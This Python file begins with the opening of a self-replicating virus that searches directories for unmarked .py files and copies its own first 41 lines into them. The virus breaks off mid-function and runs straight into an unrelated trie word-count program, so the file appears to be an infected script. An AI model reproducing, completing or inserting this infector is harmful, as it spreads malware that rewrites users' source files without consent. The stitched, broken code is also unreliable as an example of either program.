#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python implementation to count words in a trie
     
# Alphabet size (# of symbols)
from pickle import NONE
 
ALPHABET_SIZE = 26
 
# Trie node
class TrieNode:
         
    def __init__(self):
        # isLeaf is true if the node represents
        # end of a word
        self.isLeaf = False
        self.children = [None for i in range(ALPHABET_SIZE)]
     
 
root = TrieNode()
         
# If not present, inserts key into trie
# If the key is prefix of trie node, just
# marks leaf node
def insert(key):
 
    length = len(key)
     
    pCrawl = root
     
    for level in range(length):
 
        index = ord(key[level]) - ord('a')
        if (pCrawl.children[index] == None):
            pCrawl.children[index] = TrieNode()
         
        pCrawl = pCrawl.children[index]
         
    # mark last node as leaf
    pCrawl.isLeaf = True
 
     
# Function to count number of words
def wordCount(root):
 
    result = 0
     
    # Leaf denotes end of a word
    if (root.isLeaf == True):
        result += 1
         
    for i in range(ALPHABET_SIZE):   
        if (root.children[i] != None):
            result += wordCount(root.children[i])
         
    return result
     
# Driver Program
 
# Input keys (use only 'a' through 'z'
# and lower case)
keys = ["the", "a", "there", "answer", "any", "by", "bye", "their"];
 
root = TrieNode()
 
# Construct Trie
for i in range(len(keys)):
    insert(keys[i])
     
print(wordCount(root))
 
# This code is contributed by shinjanpatra